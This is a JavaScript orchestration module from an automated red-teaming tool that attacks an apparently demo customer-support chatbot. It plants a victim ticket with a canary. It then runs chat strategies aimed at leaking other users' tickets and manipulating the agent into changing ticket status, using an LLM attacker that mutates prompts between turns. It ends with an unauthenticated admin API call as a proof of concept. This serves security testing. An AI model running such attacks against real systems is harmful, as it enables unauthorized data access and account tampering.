// engine.mjs — the campaign lifecycle: WAKE → SETUP → (ATTACK → JUDGE → RECORD) × 5 → SUMMARY.
// No bandit, no REINFORCE loop — attacker-pro explores because MerciBank rewards breadth; here
// five specific, already-known bugs just need five specific, predictable attempts, run once each,
// in a fixed order a demo can narrate. `node verify.mjs` (separate) checks they reproduce.

import { Client } from './client.mjs';
import { STRATEGIES } from './strategies.mjs';
import { OBJECTIVES, canariesFor } from './objectives.mjs';
import { judgeText, judgeFlag } from './judge.mjs';
import * as brain from './brain.mjs';
import * as mem from './memory.mjs';
import { emit as uiEmit } from './ui.mjs';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

export async function runCampaign(opts = {}) {
  const emit = opts.emit || uiEmit;
  const delay = Number(opts.delay ?? process.env.ATTACK_DELAY_MS ?? 400);
  const maxTurns = Number(opts.maxTurns ?? process.env.MAX_TURNS ?? 3);

  // ---------- WAKE ----------
  emit({ type: 'phase', name: 'WAKE', note: 'checking the target and the attacker brain' });
  const client = new Client();
  const health = await client.health().catch(() => null);
  emit(health
    ? { type: 'info', msg: `target healthy · rag=${health.rag_status || '?'} · db=${health.database_status || '?'}` }
    : { type: 'warn', msg: 'could not reach /api/health — continuing anyway' });
  const model = await client.configuredModel().catch(() => 'unknown');
  emit({ type: 'info', msg: `chatbot model: ${model}  ·  attacker brain: ${brain.status() || 'none (fully scripted)'}` });

  // ---------- SETUP: plant one victim ticket with a unique, random canary ----------
  emit({ type: 'phase', name: 'SETUP', note: 'logging in as the victim once, to plant a ticket to attack' });
  const email = process.env.VICTIM_EMAIL || 'customer@example.com';
  const password = process.env.VICTIM_PASSWORD || 'customer123';
  await client.loginAsVictim(email, password);
  const canary = `CANARY-NLT-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
  const { ticketNumber, ticketId } = await client.createVictimTicket({
    subject: 'Cable not charging my laptop',
    description: `My USB-C cable stopped working yesterday. ${canary}`,
  });
  emit({ type: 'info', msg: `planted victim ticket ${ticketNumber} (id ${ticketId}) as ${email} — everything from here runs with NO login, NO cookie` });
  await sleep(delay);

  const found = [];
  async function record(objective, id, title, verdict, transcript) {
    const o = OBJECTIVES[objective];
    const finding = {
      id, status: 'CANDIDATE', title, objective, objectiveLabel: o.label, severity: o.severity,
      owasp: o.owasp, mechanism: o.mechanism, evidence: verdict.evidence, evidenceKind: verdict.kind,
      foundAt: new Date().toISOString(), transcript, ticketNumber, ticketId, canary,
    };
    mem.saveFinding(finding);
    found.push(finding);
    mem.journal(`CANDIDATE ${id} (${objective})`);
    return finding;
  }

  // ---------- ATTACK → JUDGE → RECORD, the four chat-based strategies ----------
  for (const strat of STRATEGIES) {
    const o = OBJECTIVES[strat.objective];
    emit({ type: 'strategy', id: strat.id, objective: strat.objective, objectiveLabel: o.label, title: strat.title, severity: o.severity });
    const transcript = [];
    let hitVerdict = null;
    const seeds = strat.turns === 'ladder' ? strat.seeds : [strat.seeds[0]];
    let conversationId = null;

    for (let i = 0; i < Math.min(seeds.length, maxTurns); i++) {
      let text = seeds[i].replaceAll('{{ticket}}', ticketNumber);
      if (i > 0 && brain.available()) {
        const mutated = await brain.mutate({
          goal: o.label,
          transcript: transcript.map((t) => `you: ${t.user}\nbot: ${t.reply}`).join('\n'),
        }).catch(() => null);
        if (mutated) text = mutated;
      }
      emit({ type: 'say', text });
      const turn = await client.chat(text, { authenticated: !!strat.authenticated, conversationId });
      conversationId = turn.conversationId;
      emit({ type: 'reply', text: turn.text });
      transcript.push({ user: text, reply: turn.text });

      if (strat.objective === 'AGENT_MANIPULATION') {
        await sleep(delay);
        const after = await client.readTicketAsVictim(ticketNumber).catch(() => null);
        if (after && after.status && after.status !== 'open') {
          hitVerdict = judgeFlag(true, `ticket ${ticketNumber} status flipped to "${after.status}" from an unauthenticated chat message`);
        }
      } else {
        const canaries = strat.objective === 'BOLA_TICKET' ? [canary] : canariesFor(strat.objective);
        const v = judgeText(turn.text, canaries);
        if (v.hit) hitVerdict = v;
      }
      if (hitVerdict) break;
      await sleep(delay);
    }

    if (hitVerdict) {
      emit({ type: 'verdict', hit: true, label: o.label, kind: hitVerdict.kind, evidence: hitVerdict.evidence });
      await record(strat.objective, strat.id, strat.title, hitVerdict, transcript);
    } else {
      emit({ type: 'verdict', hit: false, detail: `${o.label} — held after ${transcript.length} turn(s)` });
      mem.journal(`MISS ${strat.id}`);
    }
    await sleep(delay);
  }

  // ---------- ADMIN_NOAUTH: a direct API call, not a chat message — the "big finish" ----------
  {
    const o = OBJECTIVES.ADMIN_NOAUTH;
    const id = 'ADMIN-STATUS-NOAUTH';
    const title = 'Change a ticket status with zero login, zero cookie';
    emit({ type: 'strategy', id, objective: 'ADMIN_NOAUTH', objectiveLabel: o.label, title, severity: o.severity });
    emit({ type: 'say', text: `PUT /api/admin/tickets/${ticketId}/status  {"status":"resolved"}   — no Authorization header, no session cookie, just a fresh anonymous CSRF token` });
    const result = await client.adminMutateStatus(ticketId, 'resolved', 'Closed by an unauthenticated request — ChatRaider proof-of-concept');
    emit({ type: 'reply', text: `HTTP ${result.status} — ${JSON.stringify(result.raw).slice(0, 150)}` });
    await sleep(delay);
    const after = await client.readTicketAsVictim(ticketNumber).catch(() => null);
    const verdict = after && after.status === 'resolved'
      ? judgeFlag(true, `ticket ${ticketNumber} status is now "resolved" — confirmed via the victim's own properly-scoped GET /api/tickets/${ticketNumber}`)
      : judgeFlag(false);
    if (verdict.hit) {
      emit({ type: 'verdict', hit: true, label: o.label, kind: verdict.kind, evidence: verdict.evidence });
      await record('ADMIN_NOAUTH', id, title, verdict, [{ user: '(direct, unauthenticated API call)', reply: JSON.stringify(result.raw) }]);
    } else {
      emit({ type: 'verdict', hit: false, detail: `${o.label} — the status did not change` });
    }
  }

  emit({ type: 'phase', name: 'SUMMARY' });
  emit({ type: 'info', msg: `${found.length} candidate(s) found → ${mem.paths.FINDINGS}` });
  emit({ type: 'info', msg: found.length ? 'next: node verify.mjs  (reproduce · confirm)' : "no findings this run — the model held every attempt (it's non-deterministic, try again)" });
  return { found };
}
